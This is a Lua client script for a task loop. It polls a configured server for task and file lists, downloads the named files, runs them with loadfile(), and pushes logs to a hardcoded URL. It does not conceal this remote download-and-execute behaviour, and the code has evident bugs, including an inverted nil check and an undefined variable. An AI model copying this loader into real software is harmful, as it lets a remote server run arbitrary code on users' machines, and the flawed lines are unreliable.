cfile.lpush('http://server.papa.wuk.org:8080/log')

log = {}

function log:__log(lv, ...)
    local l = 'L'
    for i=1, select("#", ...) do
        l = l .. '\t' .. tostring(select(i, ...))
    end
    cfile.log(lv, l)
end

function log:debug(...)
    self:__log(0, ...)
end

function log:info(...)
    self:__log(1, ...)
end

function log:warn(...)
    self:__log(2, ...)
end

function log:error(...)
    self:__log(3, ...)
end

function log:fatal(...)
    self:__log(4, ...)
end

loop = {
    TS_FINE = 0,
    TS_DONE = 1,
    TS_EXIT = 2,

    MAX_FILE = 3,
    MAX_ERROR = 3,
}

function loop:__on_update_file(file, key, ret)
    local f = self._file_list[file]
    if 3 == f.s and cfile.check(file, f.i.s, f.i.v) then
        log:debug('loop', '__on_update_file', file)
        f.s = 4
    else 
        log:debug('loop', '__on_update_file 2', file)
        f.s = 0 
        f.e = (f.e or 0) + 1
    end
end

function loop:__update_file(file)
    local f = self._file_list[file]
    if cfile.check(file, f.i.s, f.i.v) then
        log:debug('loop', '__update_file 1', file)
        f.s = 4
    else
        log:debug('loop', '__update_file 2', file)
        chttp:fget(DATA.config.static_url .. file, file, f.i.v, function(...) self:__on_update_file(file, ...) end)
        f.s = 3
    end
end

function loop:__on_fetch_file(file, key, ret)
    log:debug('loop', '__on_fetch_file 1', file, ret)

    local r = cjson.decode(ret)
    if r then
        for k,v in pairs(r) do
            local f = self._file_list[k]
            if not f then
                f = {} 
                self._file_list[k] = f
            end
            if not f.i or v.v ~= f.i.v or v.s ~= f.i.s then
                f.s = f.s and 2 f.i = v
            end
        end
    end

    local f = self._file_list[file]
    if 1 == f.s then
        log:debug('loop', '__on_fetch_file 2', file)
        f.s = 0 f.e = (f.e or 0) + 1
    else
        log:debug('loop', '__on_fetch_file 3', file)
    end
end

function loop:__check_file()
    for k,v in pairs(self._file_list) do 
        if 0 == v.s then
            chttp:post(DATA.config.server_url, cjson.encode({tick = "file_info", data = k}), function(...) self:__on_fetch_file(k, ...) end)
            v.s = 1
        elseif 1 == v.s then
            if v.e and v.e > self.MAX_ERROR then
                log:debug('loop', '__check_file 1', file)
            end
        elseif 2 == v.s then
            self:__update_file(k)
        end
    end
end

function loop:__on_fetch_task(task, key, ret)
    log:debug('loop', '__on_fetch_task 1', task, ret)

    local r = cjson.decode(ret)
    if r then
        for k,v in pairs(r) do
            log:debug('loop', '__on_fetch_task 2', k)
            local t = self._task_list[k]
            if not t then
                t = {}
                self._task_list[k] = t
            end
            if not t.i or t.i.v ~= v.v then
                t.i = v
                for k1,v1 in pairs(v.f) do
                    local f = self._file_list[v1]
                    if not f then
                        f = {}
                        self._file_list[v1] = f
                    end
                    f.s = f.s or (f.i and 2 or 0)
                end
                t.s = 2 
            end
        end
    end

    local t = self._task_list[task]
    if 1 == t.s then
        log:debug('loop', '__on_fetch_task 2', task)
        t.s = 0 t.e = (t.e or 0) + 1
    else
        log:debug('loop', '__on_fetch_task 3', task)
    end
end

function loop:__check_task()
    for k,v in pairs(self._task_list) do 
        if not v.c then
            if not v.s or 0 == v.s then
                chttp:post(DATA.config.server_url, cjson.encode({tick = "task_info", data = k}), function(...) self:__on_fetch_task(k, ...) end)
                v.s = 1
            elseif 2 == v.s then
                local ok = true
                for k1,v1 in pairs(v.i.f) do
                    local f = self._file_list[v1]
                    if not f.s or 4 ~= f.s then
                        ok = false break
                    end
                end
                if ok then
                    log:debug('loop', '__check_task 1', k)
                    v.c = loadfile(HOME .. v.i.f[1])
                    if not v.c then
                        v.s = 0 v.e = (v.e or 0) + 1
                    else
                        self:__resume_task(k)
                    end
                end
            end
        end
    end
end

function loop:__resume_task(task)
    log:debug('loop', '__resume_task', task)

    local t = self._task_list[task]

    if t.l then
        for k,v in pairs(t.l) do
            local r = t.c()
            table.insert(v.t, { r = r })
            if r.start then
                r:start(v.d)
            end
        end
    end
end

function loop:__run_task(list, task, data)
    local t = self._task_list[task]
    if t and t.c then
        local r = t.c()
        table.insert(list, { r = r })
        if r.start then
            r:start(data)
        end
    else
        if not t then
            t = { l = {} }
            self._task_list[task] = t
        end
        table.insert(t.l, { t = list, d = data })
    end
end

function loop:start()
    log:debug('loop', 'start')

    self._file_list = {}

	self._task_list = {}
    self._push_list = {}
    self._post_list = {}

    self:push('task/ping', 'test')
end

function loop:stop()
    local h = self._push_list[1]
    if h and h.r.stop then
        h.r:stop()
    end
    self._push_list = {}

    for i = #self._post_list, 1, -1 do
        local t = self._post_list[i]
        if t and t.r.stop then
            t.r:stop()
        end
    end
    self._post_list = {}
end

function loop:update()
    self:__check_file()
    self:__check_task()

    local time = os.time()

    local h = self._push_list[1]
    if h and h.r.update then
        local st = h.r:update(time)
        if self.TS_FINE ~= st then
            if h.r.stop then
                h.r:stop()
            end
            table.remove(self._push_list, 1)
            if self.TS_EXIT == st then
                bind:call('loop.restart')
            end
        end
    end

    for i = #self._post_list, 1, -1 do
        local t = self._post_list[i]
        if not t then
            local st = self.TS_DONE
            if t.r.update then
                st = t.r:update(time)
            end
            if self.TS_FINE ~= st then
                if t.r.stop then
                    t.r:stop()
                end
                table.remove(self._post_list, i)
                if self.TS_EXIT == st then
                    bind:call('loop.restart')
                end
            end
        end
    end
end

function loop:event(type, data, sign)
    local h = self._push_list[1]
    if h and h.r.event then
        if h.r:event(type, data, sign) then
            return
        end
    end

    for i = #self._post_list, 1, -1 do
        local t = self._post_list[i]
        if t and t.r.event then
            if t.r:event(type, data, sign) then
                break
            end
        end
    end
end

function loop:push(task, data)
    self:__run_task(self._push_list, task, data)
end

function loop:post(task, data)
    self:__run_task(self._post_list, task, data)
end

function cbind.loop()
    loop:update()
end
function cbind.stop()
    loop:stop()
end
function cbind.event(type, data, sign)
    loop:event(type, data, sign)
end
cbind:bind()

loop:start()
